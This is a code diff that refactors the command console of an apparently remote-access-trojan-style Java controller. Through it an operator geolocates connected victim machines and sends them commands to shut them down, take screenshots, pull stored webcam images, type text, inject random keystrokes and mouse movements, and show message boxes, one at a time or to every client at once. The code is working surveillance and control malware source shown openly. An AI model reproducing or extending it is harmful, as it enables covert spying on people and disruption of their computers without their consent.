@@ -7,9 +7,7 @@ import com.maxmind.geoip2.exception.GeoIp2Exception;
 import com.maxmind.geoip2.model.CityResponse;
 import com.maxmind.geoip2.model.CountryResponse;
 import com.maxmind.geoip2.model.IspResponse;
-import com.sun.org.apache.bcel.internal.generic.RET;
 
-import java.io.DataInputStream;
 import java.io.File;
 import java.io.IOException;
 import java.net.InetAddress;
@@ -71,7 +69,7 @@ public class ClientCommander implements Runnable
     private boolean commandValid(String command)
     {
         command = command.toLowerCase();
-        return command != null || command.equals(RETRIEVE) || command.equals(TYPE) || command.equals(CHAOS) || command.equals(HELP) || command.equals(COUNT) || command.equals(ONLINE) || command.equals(EJECT) || command.equals(SOUND) || command.equals(SHUTDOWN) || command.equals(RESTART) || command.equals(SCREENSHOT) || command.equals(MSG);
+        return command != null || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
     }
 
     /**
@@ -103,31 +101,33 @@ public class ClientCommander implements Runnable
     private void printHelp(String command)
     {
         if(command == null) // user wants full help
-            System.out.println("Usage:\n\t" + COUNT + "\n\t" + ONLINE + "\n\t" + HELP + "\n\t" + EJECT + " HOST\n\t" + SHUTDOWN + " HOST\n\t" + RESTART + " HOST\n\t" + SCREENSHOT + " HOST\n\t" + SOUND + " HOST /path/to/local/sound/file\n\t" + MSG + " \"message body\" \"message box title\" type\n\t" + CHAOS + " HOST DURATION DELAY\n\t" + TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
+            System.out.println("Usage:\n\t" + CMD_COUNT + "\n\t" + CMD_ONLINE + "\n\t" + CMD_HELP + "\n\t" + CMD_SYSINFO + " HOST\n\t" + CMD_EJECT + " HOST\n\t" + CMD_SHUTDOWN + " HOST\n\t" + CMD_RESTART + " HOST\n\t" + CMD_SCREENSHOT + " HOST\n\t" + CMD_SOUND + " HOST /path/to/local/sound/file\n\t" + CMD_MSG + " \"message body\" \"message box title\" type\n\t" + CMD_CHAOS + " HOST DURATION DELAY\n\t" + CMD_TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
         else
         {
-            if(command.equals(COUNT))
-                System.out.println(COUNT + " displays the number of currently connected clients.\nExample usage:\n\t" + COUNT);
-            else if(command.equals(ONLINE))
-                System.out.println(ONLINE + " displays info about each of the connected clients, this includes their IP address and geolocation.\nExample usage:\n\t" + ONLINE);
-            else if(command.equals(EJECT))
-                System.out.println(EJECT + " will eject the disk / disk tray on the client.\nExample usage:\n\t" + EJECT + " 127.0.0.1");
-            else if(command.equals(SHUTDOWN))
-                System.out.println(SHUTDOWN + " will turn off the clients computer.\nExample usage:\n\t" + SHUTDOWN + " 127.0.0.1");
-            else if(command.equals(RESTART))
-                System.out.println(RESTART + " will restart the clinets computer.\nExample usage:\n\t" + RESTART + " 127.0.0.1");
-            else if(command.equals(SCREENSHOT))
-                System.out.println(SCREENSHOT + " will take a screenshot of the clients screen.\nExample usage:\n\t" + SCREENSHOT + " 127.0.0.1");
-            else if(command.equals(SOUND))
-                System.out.println(SOUND + " will play a sound on the clients computer.\nExample usage:\n\t" + SOUND + " 127.0.0.1 /path/to/local/sound/file");
-            else if(command.equals(MSG))
-                System.out.println(MSG + " will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\t" + MSG + " 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
-            else if(command.equals(CHAOS))
-                System.out.println(CHAOS + " will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\t" + CHAOS + " 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
-            else if(command.equals(TYPE))
-                System.out.println(TYPE + " will type the provided message on the clients computer.\nExample usage:\n\t" + TYPE + " 127.0.0.1 \"this is will get typed out\"");
-            else if(command.equals(RETRIEVE))
-                System.out.println(RETRIEVE + " will get all the screenshots/webcam images taken on the clients computer and transfer them to the server.\nExample usage:\n\t" + RETRIEVE + " 127.0.0.1");
+            if(command.equals(CMD_COUNT))
+                System.out.println(CMD_COUNT + " displays the number of currently connected clients.\nExample usage:\n\t" + CMD_COUNT);
+            else if(command.equals(CMD_ONLINE))
+                System.out.println(CMD_ONLINE + " displays info about each of the connected clients, this includes their IP address and geolocation.\nExample usage:\n\t" + CMD_ONLINE);
+            else if(command.equals(CMD_EJECT))
+                System.out.println(CMD_EJECT + " will eject the disk / disk tray on the client.\nExample usage:\n\t" + CMD_EJECT + " 127.0.0.1");
+            else if(command.equals(CMD_SHUTDOWN))
+                System.out.println(CMD_SHUTDOWN + " will turn off the clients computer.\nExample usage:\n\t" + CMD_SHUTDOWN + " 127.0.0.1");
+            else if(command.equals(CMD_RESTART))
+                System.out.println(CMD_RESTART + " will restart the clinets computer.\nExample usage:\n\t" + CMD_RESTART + " 127.0.0.1");
+            else if(command.equals(CMD_SCREENSHOT))
+                System.out.println(CMD_SCREENSHOT + " will take a screenshot of the clients screen.\nExample usage:\n\t" + CMD_SCREENSHOT + " 127.0.0.1");
+            else if(command.equals(CMD_SOUND))
+                System.out.println(CMD_SOUND + " will play a sound on the clients computer.\nExample usage:\n\t" + CMD_SOUND + " 127.0.0.1 /path/to/local/sound/file");
+            else if(command.equals(CMD_MSG))
+                System.out.println(CMD_MSG + " will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\t" + CMD_MSG + " 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
+            else if(command.equals(CMD_CHAOS))
+                System.out.println(CMD_CHAOS + " will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\t" + CMD_CHAOS + " 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
+            else if(command.equals(CMD_TYPE))
+                System.out.println(CMD_TYPE + " will type the provided message on the clients computer.\nExample usage:\n\t" + CMD_TYPE + " 127.0.0.1 \"this is will get typed out\"");
+            else if(command.equals(CMD_RETRIEVE))
+                System.out.println(CMD_RETRIEVE + " will get all the screenshots/webcam images taken on the clients computer and transfer them to the server.\nExample usage:\n\t" + CMD_RETRIEVE + " 127.0.0.1");
+            else if(command.equals(CMD_SYSINFO))
+                System.out.println(CMD_SYSINFO + " will return the client's operating system.\nExample usage:\n\t" + CMD_SYSINFO + " 127.0.0.1");
         }
     }
 
@@ -144,19 +144,19 @@ public class ClientCommander implements Runnable
 
         // Zero argument commands: online, count, help
         // e.g. count
-        if(command.equals(ONLINE))
+        if(command.equals(CMD_ONLINE))
         {
             printOnlineClients();
             return;
         }
 
-        if(command.equals(COUNT))
+        if(command.equals(CMD_COUNT))
         {
             printOnlineCount();
             return;
         }
 
-        if(command.equals(HELP))
+        if(command.equals(CMD_HELP))
         {
             if(commandTokens.size() == 2)
                 printHelp(commandTokens.get(1));
@@ -165,7 +165,7 @@ public class ClientCommander implements Runnable
             return;
         }
 
-        // One argument commands: eject, shutdown, reboot, screenshot, retrieve
+        // One argument commands: eject, shutdown, reboot, screenshot, retrieve, os
         // e.g. eject 127.0.0.1
         String host = null;
         if(commandTokens.size() > 1)
@@ -174,22 +174,23 @@ public class ClientCommander implements Runnable
             throw new NullCommandException("Host not provided");
 
         ConnectedClient target = null;
-        if(host.equals(ALL))
+        if(host.equals(HOST_ALL))
             sendCommandAll(command);
         else // find the specified client
             target = connectedClients.get(InetAddress.getByName(host));
 
-        if(target == null && !host.equals(ALL))
+        if(target == null && !host.equals(HOST_ALL))
             throw new UnknownHostException(host + " isn't online or doesn't exist");
 
-        if(!host.equals(ALL))
+        if(!host.equals(HOST_ALL))
             target.sendCommandPart(command); // send the cmd to the specified connected client
 
-        if(command.equals(RETRIEVE)) // todo: retrieve doesn't know how many files the client is going to send over
+        if(command.equals(CMD_SYSINFO))
+            target.printClientOSInfo();
+
+        if(command.equals(CMD_RETRIEVE))
         {
-            DataInputStream inFromClient = new DataInputStream(target.getConnection().getInputStream());
-            int numberOfFiles = inFromClient.readInt(); // need to know the amount of files the client is going to send over
-            new Thread(new Retriever(target.getConnection(), numberOfFiles)).start();
+            target.retrieve();
             return;
         }
 
@@ -199,24 +200,21 @@ public class ClientCommander implements Runnable
         if(commandTokens.size() == 3)
         {
             argument = commandTokens.get(2);
-            if(command.equals(TYPE))
+            if(command.equals(CMD_TYPE))
             {
-                if(host.equals(ALL)) // command has already been sent, just need to send argument now
+                if(host.equals(HOST_ALL)) // command has already been sent, just need to send argument now
                     sendCommandAll(argument);
                 else
                     target.sendCommandPart(argument); // if the client recieves the msg command it knows to read the next line of input (the msg itself)
             }
-            else
+            else if(command.equals(CMD_SOUND)) // special as we need to send the sound file to the client
             {
-                if(command.equals(SOUND)) // special as we need to send the sound file to the client
-                {
-                    File sound = new File(argument);
-                    int size = (int)sound.length();
-                    if(host.equals(ALL))
-                        sendFileAll(sound, size);
-                    else
-                        target.sendFile(sound, size);
-                }
+                File sound = new File(argument);
+                int size = (int)sound.length();
+                if(host.equals(HOST_ALL))
+                    sendFileAll(sound, size);
+                else
+                    target.sendFile(sound, size);
             }
         }
 
@@ -227,7 +225,7 @@ public class ClientCommander implements Runnable
         {
             length = commandTokens.get(2);
             delay = commandTokens.get(3);
-            if(host.equals(ALL))
+            if(host.equals(HOST_ALL))
             {
                 sendCommandAll(length);
                 sendCommandAll(delay);
@@ -247,7 +245,7 @@ public class ClientCommander implements Runnable
             msg = commandTokens.get(2);
             title = commandTokens.get(3);
             type = commandTokens.get(4);
-            if(host.equals(ALL))
+            if(host.equals(HOST_ALL))
             {
                 sendCommandAll(msg);
                 sendCommandAll(title);
